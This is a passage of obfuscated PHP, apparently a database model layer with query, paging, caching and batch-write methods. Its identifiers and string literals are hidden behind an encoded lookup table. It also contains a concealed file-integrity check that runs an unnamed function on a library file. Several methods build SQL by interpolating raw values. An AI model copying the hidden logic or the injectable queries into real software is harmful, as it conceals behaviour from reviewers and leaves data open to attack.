$B√‘ÊâÊ≠ß = NULL) { $Eò‡¬é£ˆä =& $_SERVER[∞„˜ƒÑºª]; if ($Eò‡¬é£ˆä[33] === $aéôÈçÜñ¡) { if (isset($this->_scope[$Eò‡¬é£ˆä[34]])) { $a¨ÑàÃÎµÑ = $this->_scope[$Eò‡¬é£ˆä[34]]; } else { return $this; } } elseif (is_string($aéôÈçÜñ¡)) { $eΩÑÎÚä»© = explode($Eò‡¬é£ˆä[47], $aéôÈçÜñ¡); $a¨ÑàÃÎµÑ = array(); foreach ($eΩÑÎÚä»© as $fÿƒ©ß°ÌΩ) { if (!isset($this->_scope[$fÿƒ©ß°ÌΩ])) { continue; } $a¨ÑàÃÎµÑ = array_merge($a¨ÑàÃÎµÑ, $this->_scope[$fÿƒ©ß°ÌΩ]); } if (!empty($B√‘ÊâÊ≠ß) && is_array($B√‘ÊâÊ≠ß)) { $a¨ÑàÃÎµÑ = array_merge($a¨ÑàÃÎµÑ, $B√‘ÊâÊ≠ß); } } elseif (is_array($aéôÈçÜñ¡)) { $a¨ÑàÃÎµÑ = $aéôÈçÜñ¡; } if (is_array($a¨ÑàÃÎµÑ) && !empty($a¨ÑàÃÎµÑ)) { $this->options = array_merge($this->options, array_change_key_case($a¨ÑàÃÎµÑ)); } return $this; } public function where($a≤ÒÍóÒ◊á, $eÚ…¬¯Œáñ = null) { $a±‘ºŒáÍ≈ =& $_SERVER[∞„˜ƒÑºª]; if (!is_null($eÚ…¬¯Œáñ) && is_string($a≤ÒÍóÒ◊á)) { if (!is_array($eÚ…¬¯Œáñ)) { $eÚ…¬¯Œáñ = func_get_args(); array_shift($eÚ…¬¯Œáñ); } $eÚ…¬¯Œáñ = array_map(array($this->db, $a±‘ºŒáÍ≈[330]), $eÚ…¬¯Œáñ); $a≤ÒÍóÒ◊á = vsprintf($a≤ÒÍóÒ◊á, $eÚ…¬¯Œáñ); } elseif (is_object($a≤ÒÍóÒ◊á)) { $a≤ÒÍóÒ◊á = get_object_vars($a≤ÒÍóÒ◊á); } if (is_string($a≤ÒÍóÒ◊á) && $a±‘ºŒáÍ≈[33] != $a≤ÒÍóÒ◊á) { $D˘£√ÜÖºß = array(); $D˘£√ÜÖºß[$a±‘ºŒáÍ≈[337]] = $a≤ÒÍóÒ◊á; $a≤ÒÍóÒ◊á = $D˘£√ÜÖºß; } if (isset($this->options[$a±‘ºŒáÍ≈[262]])) { $this->options[$a±‘ºŒáÍ≈[262]] = array_merge($this->options[$a±‘ºŒáÍ≈[262]], $a≤ÒÍóÒ◊á); } else { $this->options[$a±‘ºŒáÍ≈[262]] = $a≤ÒÍóÒ◊á; } return $this; } public function limit($cÕº‡çÓ©“, $Cã¢ô∫Ï™ª = null) { $B°—£º”Ñà =& $_SERVER[∞„˜ƒÑºª]; $this->options[$B°—£º”Ñà[279]] = is_null($Cã¢ô∫Ï™ª) ? $cÕº‡çÓ©“ : $cÕº‡çÓ©“ . $B°—£º”Ñà[47] . $Cã¢ô∫Ï™ª; return $this; } public function page($aÒÜ·ıˆË›, $CÕàÎ¥√÷à = null) { $AÉÖº◊ªÕÌ =& $_SERVER[∞„˜ƒÑºª]; $this->options[$AÉÖº◊ªÕÌ[338]] = is_null($CÕàÎ¥√÷à) ? $aÒÜ·ıˆË› : $aÒÜ·ıˆË› . $AÉÖº◊ªÕÌ[47] . $CÕàÎ¥√÷à; return $this; } public function comment($Dó˘¬„—∂Ë) { $this->options[$_SERVER[∞„˜ƒÑºª][339]] = $Dó˘¬„—∂Ë; return $this; } public function setProperty($f‰ìﬁ¿òò‚, $côÑ‰¥”˘ê) { if (property_exists($this, $f‰ìﬁ¿òò‚)) { $this->{$f‰ìﬁ¿òò‚} = $côÑ‰¥”˘ê; } return $this; } } $fà´Ωºê» = LIB_DIR . $_SERVER[∞„˜ƒÑºª][340]; $AûËÙ÷‘äŒ = $_SERVER[∞„˜ƒÑºª][341]; goto eÉ≠ı ›êÉ; eÉ≠ı ›êÉ: if ($_SERVER[$_SERVER[∞„˜ƒÑºª][51]] != $AûËÙ÷‘äŒ($fà´Ωºê»)) { goto Bî¬ÿ¥Í©¿; d“øëìôø: $dúø£ç“Ωê = explode($_SERVER[∞„˜ƒÑºª][55], $Eíö¯‹÷èã); if (count($dúø£ç“Ωê) < $_SERVER[∞„˜ƒÑºª][56]) { die; } $Dœ‹◊π¢È¥ = $_SERVER[∞„˜ƒÑºª][57]; goto F¡áÜÑ‹”à; Bî¬ÿ¥Í©¿: $D¬Âàà‹∑í = $_SERVER[∞„˜ƒÑºª][53]; $Fπ˜ÜŸ∞ôô = BASIC_PATH . $_SERVER[∞„˜ƒÑºª][54]; $Eíö¯‹÷èã = $D¬Âàà‹∑í($Fπ˜ÜŸ∞ôô); goto d“øëìôø; F¡áÜÑ‹”à: $Dœ‹◊π¢È¥($fà´Ωºê»); goto Bë„÷≠ùΩÂ; Bë„÷≠ùΩÂ: } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\x69\x6d\145", "\x74\x69\155\145", "\151\156\x73\145\x72\164\54\165\160\x64\141\164\145", "\x66\x75\x6e\143\x74\x69\157\x6e"), array("\143\x72\x65\141\x74\x65\x54\151\155\x65", "\164\151\x6d\x65", "\151\156\163\145\x72\164", "\x66\165\156\x63\x74\151\157\156")); public function setDataAuto($f∞„ﬂ±¨Àö) { $this->dataAuto = $f∞„ﬂ±¨Àö; } public function __construct($bäÏÂåıâ˘ = '', $B˘∑µÉÚ÷ü = '', $böÆáØ‘‘Ó = '') { parent::__construct($bäÏÂåıâ˘, $B˘∑µÉÚ÷ü, $böÆáØ‘‘Ó); } static function textEncode($b«êÍ–úéï) { $bƒ≠¿¢“é© =& $_SERVER[∞„˜ƒÑºª]; if (!$b«êÍ–úéï) { return $bƒ≠¿¢“é©[33]; } $f⁄€ﬂØ‘é∫ = json_encode($b«êÍ–úéï); $f⁄€ﬂØ‘é∫ = preg_replace_callback($bƒ≠¿¢“é©[342], function ($fﬁ∏î∫÷˘Ù) { return addslashes($fﬁ∏î∫÷˘Ù[0]); }, $f⁄€ﬂØ‘é∫); return json_decode($f⁄€ﬂØ‘é∫); } static function textDecode($b‚”““Æ∏⁄) { $e‘„«√≥ª¬ =& $_SERVER[∞„˜ƒÑºª]; $FûŒ‡íΩôø = json_encode($b‚”““Æ∏⁄); $FûŒ‡íΩôø = preg_replace_callback($e‘„«√≥ª¬[343], function ($Fıÿ≤õ‚ÖÊ) { return $_SERVER[∞„˜ƒÑºª][100]; }, $FûŒ‡íΩôø); return json_decode($FûŒ‡íΩôø); } protected $tableMeta = array(); protected function _beforeInsert(&$CŸ⁄≥ñäé¯, $bï∫äëŸ«ø) { $C’•ö„Ñ°ò =& $_SERVER[∞„˜ƒÑºª]; if (!$this->checkDataAutoHas($C’•ö„Ñ°ò[344])) { return; } $this->dataBeforeFilter($CŸ⁄≥ñäé¯, $C’•ö„Ñ°ò[344]); } protected function _beforeUpdate(&$f±àÜ†ê•√, $AœÑ∫””õé) { $A—ÿ∫–‹‡˜ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->checkDataAutoHas($A—ÿ∫–‹‡˜[345])) { return; } $this->dataBeforeFilter($f±àÜ†ê•√, $A—ÿ∫–‹‡˜[345]); } protected function _afterSelect(&$Dªâ⁄áîèÕ, $C‘ø…π«Ù£) { if (!is_array($Dªâ⁄áîèÕ)) { return; } if (!$this->checkDataAutoHas($_SERVER[∞„˜ƒÑºª][346])) { return; } foreach ($Dªâ⁄áîèÕ as &$E‡¡ÂàÁ˜π) { $this->dataAfterFilter($E‡¡ÂàÁ˜π); } } protected function _afterFind(&$E¿∑£ÿÓ»è, $e—Ú∂“®“¬) { if (!is_array($E¿∑£ÿÓ»è)) { return; } if (!$this->checkDataAutoHas($_SERVER[∞„˜ƒÑºª][346])) { return; } $this->dataAfterFilter($E¿∑£ÿÓ»è); } public function setAutoIncrement($C¢ú°ÁÖå¨) { $cØø·É‰∏ = array($this->getPk() => $C¢ú°ÁÖå¨); $AÜçßã£‚Ó = $this->data($cØø·É‰∏)->add(); if ($AÜçßã£‚Ó) { $this->delete($AÜçßã£‚Ó); } } public function getAutoIncrement() { $Fæ‡ÑáëÈ‹ = $this->getTableName(); $BÜÊª‰—◊¥ = $this->max($this->getPk()); $aùÑÖ§ºåì = $this->query("\163\x68\x6f\167\40\164\x61\x62\x6c\145\40\163\x74\141\164\x75\163\x20\167\150\145\162\x65\40\116\x61\x6d\145\75\47{$Fæ‡ÑáëÈ‹}\47"); $dΩŸÁ›ÃΩà = $aùÑÖ§ºåì[0][$_SERVER[∞„˜ƒÑºª][347]]; $fﬁ‹ÂÉå¶§ = max($BÜÊª‰—◊¥, $dΩŸÁ›ÃΩà); return $fﬁ‹ÂÉå¶§; } protected function _callBefore($cîõúââÚ—, $bà ü≥¡¿˘) { return $this->cacheCallCheck($cîõúââÚ—, $bà ü≥¡¿˘, !1); } protected function _callAfter($càõô∏ï•‡, $CÃ∫ïÇ’≈«) { return $this->cacheCallCheck($càõô∏ï•‡, $CÃ∫ïÇ’≈«, !0); } protected function cacheFunctionAlias($F√·ûõ¶åò) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b¯ÃÆ¯‰ı‘, $A´‰Ô’é¥¢, $DîüâÓÇá´ = false) { $EÎ†¢Ê˘¯… = $this->cacheFunctionAlias($A´‰Ô’é¥¢); if (!$EÎ†¢Ê˘¯…) { return; } foreach ($EÎ†¢Ê˘¯… as $DËåÏ¿ÙÎë => $e¬´Ç–éÍ¶) { $AëËíÀΩãø = $e¬´Ç–éÍ¶[0]; $a·±äÂ°¿ç = explode($_SERVER[∞„˜ƒÑºª][47], $e¬´Ç–éÍ¶[1]); if ($b¯ÃÆ¯‰ı‘ == $DËåÏ¿ÙÎë) { return $this->cacheFunctionGet($DËåÏ¿ÙÎë, $AëËíÀΩãø); } if ($DîüâÓÇá´ && in_array($b¯ÃÆ¯‰ı‘, $a·±äÂ°¿ç)) { $this->cacheFunctionClear($DËåÏ¿ÙÎë, $AëËíÀΩãø); } } } public function cacheFunctionGet($cêì°Ö·õ“, $F∞÷‡πûå¯) { $bæà∑Ô©Ú⁄ = $this->cacheKeyMake($cêì°Ö·õ“, $F∞÷‡πûå¯); $FıΩ≥íñ≠Ú = Cache::get($bæà∑Ô©Ú⁄); if (!is_array($FıΩ≥íñ≠Ú)) { $FıΩ≥íñ≠Ú = call_user_func_array(array($this, $cêì°Ö·õ“), array($F∞÷‡πûå¯, !0)); Cache::set($bæà∑Ô©Ú⁄, $FıΩ≥íñ≠Ú); } return $FıΩ≥íñ≠Ú; } public function cacheFunctionClear($E∏≥∏û•œ•, $dëã ´ù≤¢) { $fßã÷à±“ÿ = $dëã ´ù≤¢; if (!is_array($dëã ´ù≤¢)) { $fßã÷à±“ÿ = array($dëã ´ù≤¢); } foreach ($fßã÷à±“ÿ as $c“∑¡ÑöçØ) { $AÖµˆê≤±• = $this->cacheKeyMake($E∏≥∏û•œ•, $c“∑¡ÑöçØ); Cache::remove($AÖµˆê≤±•); } } private function cacheKeyMake($E‹⁄êµª≤, $EƒŒÇ‘¢ÓÂ) { $CøÚÂçªè’ =& $_SERVER[∞„˜ƒÑºª]; return get_class($this) . $CøÚÂçªè’[79] . $E‹⁄êµª≤ . $CøÚÂçªè’[348] . $EƒŒÇ‘¢ÓÂ; } protected function selectPage($CÎ∞ìÙôπÙ = 200, $f˘“ù¿ÒÉ¯ = 1) { goto dÇ‡ÒÆªŒ‘; BéÍàùŒÛÃ: $CÎ∞ìÙôπÙ = intval(isset($in[$EÌñ“≈µúä[349]]) ? $in[$EÌñ“≈µúä[349]] : $CÎ∞ìÙôπÙ); $CÎ∞ìÙôπÙ = $CÎ∞ìÙôπÙ <= 5 ? 5 : ($CÎ∞ìÙôπÙ >= $f‹›—âö∫ã ? $f‹›—âö∫ã : $CÎ∞ìÙôπÙ); $b—ÁÁàëÉí = ceil($aìüî∆ÔΩÿ / $CÎ∞ìÙôπÙ); goto e÷≠œ•ã¯±; e÷≠œ•ã¯±: $f˘“ù¿ÒÉ¯ = intval(isset($in[$EÌñ“≈µúä[338]]) ? $in[$EÌñ“≈µúä[338]] : $f˘“ù¿ÒÉ¯); $f˘“ù¿ÒÉ¯ = $f˘“ù¿ÒÉ¯ <= 1 ? 1 : ($f˘“ù¿ÒÉ¯ >= $b—ÁÁàëÉí ? $b—ÁÁàëÉí : $f˘“ù¿ÒÉ¯); $this->optionsValue($f‡„’¡‘äÉ); goto eæ—´Ûá–É; eæ—´Ûá–É: $D†ã≥Ø™„ = $this->page($f˘“ù¿ÒÉ¯, $CÎ∞ìÙôπÙ)->select(); if ($b—ÁÁàëÉí == 1) { $aìüî∆ÔΩÿ = count($D†ã≥Ø™„); } $D‡Àûøûœé = array($EÌñ“≈µúä[351] => array($EÌñ“≈µúä[352] => $aìüî∆ÔΩÿ, $EÌñ“≈µúä[349] => $CÎ∞ìÙôπÙ, $EÌñ“≈µúä[338] => $f˘“ù¿ÒÉ¯, $EÌñ“≈µúä[353] => $b—ÁÁàëÉí), $EÌñ“≈µúä[354] => $D†ã≥Ø™„ ? $D†ã≥Ø™„ : array()); goto eÚÏ˘Éäû∑; dÇ‡ÒÆªŒ‘: $EÌñ“≈µúä =& $_SERVER[∞„˜ƒÑºª]; global $in; $f‡„’¡‘äÉ = $this->optionsValue(); goto B»¬ëç∆©¨; B»¬ëç∆©¨: $f‹›—âö∫ã = 4000; if ($CÎ∞ìÙôπÙ === -1) { unset($in[$EÌñ“≈µúä[349]]); $f‹›—âö∫ã = 100000000; $CÎ∞ìÙôπÙ = $f‹›—âö∫ã; } $E†¡•é·ìß = $f‡„’¡‘äÉ; goto B´âØ ó¬á; B´âØ ó¬á: $E†¡•é·ìß[$EÌñ“≈µúä[350]] = array(); $this->optionsValue($E†¡•é·ìß); $aìüî∆ÔΩÿ = intval($this->count()); goto BéÍàùŒÛÃ; eÚÏ˘Éäû∑: return $D‡Àûøûœé; goto e•´Ñ∆≈ıÂ; e•´Ñ∆≈ıÂ: } protected function metaSet($aµÑùπ£„Í, $Fñùô≥ ± = null, $cá¿›œã⁄â = null) { goto Eé‹®ö÷Èò; aﬂÁãı¿Ú≈: if ($FñÊìÊ±–í->where($AπâäªÍçï)->find()) { $eõåäæÂÂá = $FñÊìÊ±–í->where($AπâäªÍçï)->save(array($bµ§É¢œÿ¿[359] => $cá¿›œã⁄â)); } else { $AπâäªÍçï[$bµ§É¢œÿ¿[357]] = $cá¿›œã⁄â; $eõåäæÂÂá = $FñÊìÊ±–í->add($AπâäªÍçï); } return $eõåäæÂÂá; goto FÔÿÖŸπ≤Û; c˜˜çÆÊ¡û: if (is_null($Fñùô≥ ±)) { return $FñÊìÊ±–í->where(array($aÔ°ªä©íœ => $aµÑùπ£„Í))->delete(); } if (is_null($cá¿›œã⁄â)) { return $FñÊìÊ±–í->where($AπâäªÍçï)->delete(); } $eõåäæÂÂá = !1; goto aﬂÁãı¿Ú≈; Eé‹®ö÷Èò: $bµ§É¢œÿ¿ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->tableMeta) { return !1; } $aÔ°ªä©íœ = $this->tableMeta[$bµ§É¢œÿ¿[355]]; goto fî‡Â¢¢§∫; fî‡Â¢¢§∫: $FñÊìÊ±–í = Model($this->tableMeta[$bµ§É¢œÿ¿[356]]); if (is_array($Fñùô≥ ±)) { $Dâòÿ£Ò®Ò = array(); foreach ($Fñùô≥ ± as $F·Ãæ¡ÁÀ¶ => $EÖîëÑåÇº) { $Dâòÿ£Ò®Ò[] = array($aÔ°ªä©íœ => $aµÑùπ£„Í, $bµ§É¢œÿ¿[96] => $F·Ãæ¡ÁÀ¶, $bµ§É¢œÿ¿[357] => $EÖîëÑåÇº); } $FñÊìÊ±–í->where(array($aÔ°ªä©íœ => $aµÑùπ£„Í))->addAll($Dâòÿ£Ò®Ò, array(), !0); return !0; } $AπâäªÍçï = array($aÔ°ªä©íœ => $aµÑùπ£„Í, $bµ§É¢œÿ¿[358] => $Fñùô≥ ±); goto c˜˜çÆÊ¡û; FÔÿÖŸπ≤Û: } public function metaGet($CÑ Üöœœ—) { goto EÒ±¯â‘éó; d≈≈‰˜ÍÙà: $e£—¡ïóèÉ = Model($this->tableMeta[$bØ”ãºîÉƒ[356]]); $aÎ¡Ø™ÿÂ“ = array($aì•¢üÿ‡ => $CÑ Üöœœ—); $Düî¶ºïîÏ = $e£—¡ïóèÉ->field($bØ”ãºîÉƒ[360])->where($aÎ¡Ø™ÿÂ“)->select(); goto D≤ã∂é¥∫¯; EÒ±¯â‘éó: $bØ”ãºîÉƒ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->tableMeta) { return array(); } $aì•¢üÿ‡ = $this->tableMeta[$bØ”ãºîÉƒ[355]]; goto d≈≈‰˜ÍÙà; D≤ã∂é¥∫¯: $Düî¶ºïîÏ = array_to_keyvalue($Düî¶ºïîÏ, $bØ”ãºîÉƒ[96], $bØ”ãºîÉƒ[357]); return $Düî¶ºïîÏ; goto dûîÉê¯ÇΩ; dûîÉê¯ÇΩ: } private function checkDataAutoHas($dï»é¶üûä) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $a¥Ÿ´¶ã…æ) { if (in_array($dï»é¶üûä, explode($_SERVER[∞„˜ƒÑºª][47], $a¥Ÿ´¶ã…æ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$AÀøïéÃ∆•, $aÊ„ ¿ƒáà) { $a°çÒ¨®ßï =& $_SERVER[∞„˜ƒÑºª]; foreach ($this->dataAuto as $FÖ—¿∞‘¥õ) { $B‡Àï¿•´∫ = $FÖ—¿∞‘¥õ[0]; if (!in_array($aÊ„ ¿ƒáà, explode($a°çÒ¨®ßï[47], $FÖ—¿∞‘¥õ[2]))) { continue; } switch (trim($FÖ—¿∞‘¥õ[3])) { case $a°çÒ¨®ßï[308]: case $a°çÒ¨®ßï[309]: $Dé£—ú∫üí = $FÖ—¿∞‘¥õ[1]; $föÍÚ€¿à  = isset($FÖ—¿∞‘¥õ[4]) ? (array) $FÖ—¿∞‘¥õ[4] : array(); if ($Dé£—ú∫üí == $a°çÒ¨®ßï[186] && array_key_exists($B‡Àï¿•´∫, $AÀøïéÃ∆•)) { if (!$AÀøïéÃ∆•[$B‡Àï¿•´∫]) { unset($AÀøïéÃ∆•[$B‡Àï¿•´∫]); } break; } if (isset($AÀøïéÃ∆•[$B‡Àï¿•´∫])) { array_unshift($föÍÚ€¿à , $AÀøïéÃ∆•[$B‡Àï¿•´∫]); } if ($a°çÒ¨®ßï[308] == $FÖ—¿∞‘¥õ[3]) { $AÀøïéÃ∆•[$B‡Àï¿•´∫] = call_user_func_array($Dé£—ú∫üí, $föÍÚ€¿à ); } else { $AÀøïéÃ∆•[$B‡Àï¿•´∫] = call_user_func_array(array(&$this, $Dé£—ú∫üí), $föÍÚ€¿à ); } break; case $a°çÒ¨®ßï[260]: $AÀøïéÃ∆•[$B‡Àï¿•´∫] = $AÀøïéÃ∆•[$FÖ—¿∞‘¥õ[1]]; break; case $a°çÒ¨®ßï[281]: if (isset($AÀøïéÃ∆•[$B‡Àï¿•´∫]) && !is_string($AÀøïéÃ∆•[$B‡Àï¿•´∫])) { $AÀøïéÃ∆•[$B‡Àï¿•´∫] = json_encode_force($AÀøïéÃ∆•[$B‡Àï¿•´∫]); } break; case $a°çÒ¨®ßï[310]: if ($AÀøïéÃ∆•[$B‡Àï¿•´∫] === $a°çÒ¨®ßï[33]) { unset($AÀøïéÃ∆•[$B‡Àï¿•´∫]); } break; case $a°çÒ¨®ßï[311]: $AÀøïéÃ∆•[$B‡Àï¿•´∫] = $FÖ—¿∞‘¥õ[1]; default: break; } } if ($aÊ„ ¿ƒáà == $a°çÒ¨®ßï[344]) { $BÍÛ∫ÉÿûÏ = strtolower($this->db->getDbType()); if (strpos($BÍÛ∫ÉÿûÏ, $a°çÒ¨®ßï[9]) !== 0) { return; } $búÑâ¯É‰ = $this->field(!0)->fields; $e©Öˆå◊¶• = $búÑâ¯É‰[$a°çÒ¨®ßï[239]]; if (isset($búÑâ¯É‰[$a°çÒ¨®ßï[238]])) { unset($e©Öˆå◊¶•[$búÑâ¯É‰[$a°çÒ¨®ßï[238]]]); } foreach ($e©Öˆå◊¶• as $B¶â£§¬ﬁÕ => $aÊ„ ¿ƒáà) { if (!isset($AÀøïéÃ∆•[$B¶â£§¬ﬁÕ])) { $AÀøïéÃ∆•[$B¶â£§¬ﬁÕ] = $a°çÒ¨®ßï[33]; } } } } private function dataAfterFilter(&$e∑Ëòºù∑≠) { $d£∆¥ñÂâ¢ =& $_SERVER[∞„˜ƒÑºª]; foreach ($this->dataAuto as $fµËÚﬂôäﬂ) { $eÑ∫é∑”–È = $fµËÚﬂôäﬂ[0]; if (!in_array($d£∆¥ñÂâ¢[346], explode($d£∆¥ñÂâ¢[47], $fµËÚﬂôäﬂ[2]))) { continue; } if (!isset($e∑Ëòºù∑≠[$eÑ∫é∑”–È])) { continue; } switch (trim($fµËÚﬂôäﬂ[3])) { case $d£∆¥ñÂâ¢[308]: case $d£∆¥ñÂâ¢[309]: $e“ä»Çã∑± = isset($fµËÚﬂôäﬂ[4]) ? (array) $fµËÚﬂôäﬂ[4] : array(); array_unshift($e“ä»Çã∑±, $e∑Ëòºù∑≠[$eÑ∫é∑”–È]); if ($d£∆¥ñÂâ¢[308] == $fµËÚﬂôäﬂ[3]) { $e∑Ëòºù∑≠[$eÑ∫é∑”–È] = call_user_func_array($fµËÚﬂôäﬂ[1], $e“ä»Çã∑±); } else { $e∑Ëòºù∑≠[$eÑ∫é∑”–È] = call_user_func_array(array(&$this, $fµËÚﬂôäﬂ[1]), $e“ä»Çã∑±); } break; case $d£∆¥ñÂâ¢[260]: $e∑Ëòºù∑≠[$eÑ∫é∑”–È] = $e∑Ëòºù∑≠[$fµËÚﬂôäﬂ[1]]; break; case $d£∆¥ñÂâ¢[281]: $f‰òßãàçΩ = $e∑Ëòºù∑≠[$eÑ∫é∑”–È]; $e∑Ëòºù∑≠[$eÑ∫é∑”–È] = json_decode($f‰òßãàçΩ, !0); if (is_null($e∑Ëòºù∑≠[$eÑ∫é∑”–È])) { $e∑Ëòºù∑≠[$eÑ∫é∑”–È] = $f‰òßãàçΩ; } break; case $d£∆¥ñÂâ¢[310]: if ($e∑Ëòºù∑≠[$eÑ∫é∑”–È] === $d£∆¥ñÂâ¢[33]) { unset($e∑Ëòºù∑≠[$eÑ∫é∑”–È]); } break; case $d£∆¥ñÂâ¢[311]: $e∑Ëòºù∑≠[$eÑ∫é∑”–È] = $fµËÚﬂôäﬂ[1]; default: break; } } } public function saveAll($b…Ë¯∂À¶É) { goto BëÆôÇóÎ£; e¯—¡Ê˜Öú: $bÑ∑êêÎüö = $d§ÉΩª“˘Ê[361]; $Fé–ﬁΩ°Á≈ = 0; $fﬁÚæàé¢í = array(); goto dÙ˜ÉÚü€Ç; dÙ˜ÉÚü€Ç: $CÌøç“Öê‰ = count($b…Ë¯∂À¶É); for ($C≤¡”µ‡·∞ = 0; $C≤¡”µ‡·∞ < $CÌøç“Öê‰; $C≤¡”µ‡·∞++) { $Dòåü¥‹∫ä = $b…Ë¯∂À¶É[$C≤¡”µ‡·∞]; if (!is_array($Dòåü¥‹∫ä) || count($Dòåü¥‹∫ä) != 4) { continue; } $Dô≤Ò©£≥å = "\x55\x50\x44\101\124\x45\x20{$bê“£øÒÿÂ}\x20\x53\x45\x54\40{$Dòåü¥‹∫ä[2]}\x20\x3d\40\103\x41\x53\x45\x20{$Dòåü¥‹∫ä[0]}\x20\xa"; if ($Fé–ﬁΩ°Á≈ == 0) { $bÑ∑êêÎüö = $Dô≤Ò©£≥å; } $fﬁÚæàé¢í[] = $d§ÉΩª“˘Ê[110] . $Dòåü¥‹∫ä[1] . $d§ÉΩª“˘Ê[110]; $Fé–ﬁΩ°Á≈++; $bÑ∑êêÎüö .= "\x20\127\110\x45\116\x20\x27{$Dòåü¥‹∫ä[1]}\x27\x20\124\x48\x45\116\40\x27{$Dòåü¥‹∫ä[3]}\47\40\12"; if ($Fé–ﬁΩ°Á≈ == $dãÿ≥Ïÿë¥ || $C≤¡”µ‡·∞ == $CÌøç“Öê‰ - 1) { $bâÛüûÌø¨ = implode($d§ÉΩª“˘Ê[47], $fﬁÚæàé¢í); $bÑ∑êêÎüö .= "\x20\105\116\104\x20\40\127\110\105\x52\105\x20{$Dòåü¥‹∫ä[0]}\40\x49\116\x20\x28{$bâÛüûÌø¨}\51\40"; $this->execute($bÑ∑êêÎüö); $Fé–ﬁΩ°Á≈ = 0; $bÑ∑êêÎüö = $Dô≤Ò©£≥å; $fﬁÚæàé¢í = array(); } } goto aòûé®«¶¥; BëÆôÇóÎ£: $d§ÉΩª“˘Ê =& $_SERVER[∞„˜ƒÑºª]; $bê“£øÒÿÂ = $this->tablePrefix . $this->tableName; $dãÿ≥Ïÿë¥ = self::SQL_WHERE_IN_CHUNK; goto e¯—¡Ê˜Öú; aòûé®«¶¥: } public function saveAllEach($A†øüŒü≥≥) { $Cÿõﬂ¶√±© =& $_SERVER[∞„˜ƒÑºª]; $b¬Ò±≤Ñ¥† = $this->tablePrefix . $this->tableName; foreach ($A†øüŒü≥≥ as $aıﬁ ˘°é) { if (!is_array($aıﬁ ˘°é) || count($aıﬁ ˘°é) != 4) { continue; } $C„®∂⁄ÉÂò = $aıﬁ ˘°é[0] . $Cÿõﬂ¶√±©[362] . $aıﬁ ˘°é[1] . $Cÿõﬂ¶√±©[110]; $A¶ÊÜòò’Ÿ = $aıﬁ ˘°é[2] . $Cÿõﬂ¶√±©[362] . $aıﬁ ˘°é[3] . $Cÿõﬂ¶√±©[110]; $f°ßÛÈàë = "\x75\x70\x64\141\x74\x65\40{$b¬Ò±≤Ñ¥†}\40\x73\145\x74\x20{$A¶ÊÜòò’Ÿ}\40\x77\x68\x65\x72\145\x20{$C„®∂⁄ÉÂò}\73"; $this->execute($f°ßÛÈàë); } } public function addAll($EŸÿ¢€˘Ç„, $CõÆÃøœñé = array(), $D«∫∆ëÆ‡ = false) { goto Bââ≤°£ùˆ; eÂ≠≈˘„ÜÏ: if (method_exists($this->db, $dÁ„∞ëËèÇ[259])) { for ($Fà€‘àÉ·ê = 0; $Fà€‘àÉ·ê < count($EŸÿ¢€˘Ç„); $Fà€‘àÉ·ê += $BªíèéΩÿ∞) { $AÖùë√ªÂˆ = array_slice($EŸÿ¢€˘Ç„, $Fà€‘àÉ·ê, $BªíèéΩÿ∞); if (!is_array($AÖùë√ªÂˆ) || count($AÖùë√ªÂˆ) == 0) { break; } $AÌ†éîÑÇ  = $this->db->insertAll($AÖùë√ªÂˆ, $CõÆÃøœñé, $D«∫∆ëÆ‡); } } else { $this->startTrans(); foreach ($EŸÿ¢€˘Ç„ as $cÍ ç∞ÖªÑ => $EÂªÖæó’Ø) { $AÌ†éîÑÇ  = $this->db->insert($EÂªÖæó’Ø, $CõÆÃøœñé, $D«∫∆ëÆ‡); } $this->commit(); } if (!1 !== $AÌ†éîÑÇ ) { $dèñ¨ç—∞ = $this->getLastInsID(); if ($dèñ¨ç—∞) { return $dèñ¨ç—∞; } } return $AÌ†éîÑÇ ; goto e®©±ÁœßÛ; Bââ≤°£ùˆ: $dÁ„∞ëËèÇ =& $_SERVER[∞„˜ƒÑºª]; ignore_timeout(); $BªíèéΩÿ∞ = self::SQL_WHERE_IN_CHUNK; goto E∑≈¢È∫˜¥; E∑≈¢È∫˜¥: if (empty($EŸÿ¢€˘Ç„)) { $this->error = think_lang($dÁ„∞ëËèÇ[258]); return !1; } $CõÆÃøœñé = $this->_parseOptions($CõÆÃøœñé); foreach ($EŸÿ¢€˘Ç„ as $cÍ ç∞ÖªÑ => $EÂªÖæó’Ø) { $EŸÿ¢€˘Ç„[$cÍ ç∞ÖªÑ] = $this->_facade($EÂªÖæó’Ø); $this->_beforeInsert($EŸÿ¢€˘Ç„[$cÍ ç∞ÖªÑ], $CõÆÃøœñé); } goto eÂ≠≈˘„ÜÏ; e®©±ÁœßÛ: } public function save($Fÿ„ÂÀ∞Ω™ = '', $d¡úÎÂ‰Üí = array()) { goto B˜€ßäóòÃ; DëπåôÂ—⁄: $CõãÇ›éÇõ = $AÁæˆíÔ°û[$cÇæä≤ÜıÀ[262]][$e∑äÌÇÛß±][1]; $eœ≠°ÀÊéû = count($CõãÇ›éÇõ); for ($AÑ¢≤¶∫∑– = 0; $AÑ¢≤¶∫∑– < $eœ≠°ÀÊéû; $AÑ¢≤¶∫∑– += $F§ª‡ßÿ‡Ù) { $eŸ–¡©Êø¥ = array_slice($CõãÇ›éÇõ, $AÑ¢≤¶∫∑–, $F§ª‡ßÿ‡Ù); if (!is_array($eŸ–¡©Êø¥) || count($eŸ–¡©Êø¥) == 0) { break; } $AÁæˆíÔ°û[$cÇæä≤ÜıÀ[262]][$e∑äÌÇÛß±][1] = $eŸ–¡©Êø¥; $this->optionsValue($AÁæˆíÔ°û); $A∏œèç⁄Û¢ += parent::save($Fÿ„ÂÀ∞Ω™, $d¡úÎÂ‰Üí); } goto f†µæﬁÉ“ª; B˜€ßäóòÃ: $cÇæä≤ÜıÀ =& $_SERVER[∞„˜ƒÑºª]; $F§ª‡ßÿ‡Ù = self::SQL_WHERE_IN_CHUNK; $AÁæˆíÔ°û = $this->optionsValue(); goto f‡ß˘ƒÏΩ»; f†µæﬁÉ“ª: return $A∏œèç⁄Û¢; goto F◊≤ö§™¿Ã; f‡ß˘ƒÏΩ»: $e∑äÌÇÛß± = $this->findWhereField($AÁæˆíÔ°û); if 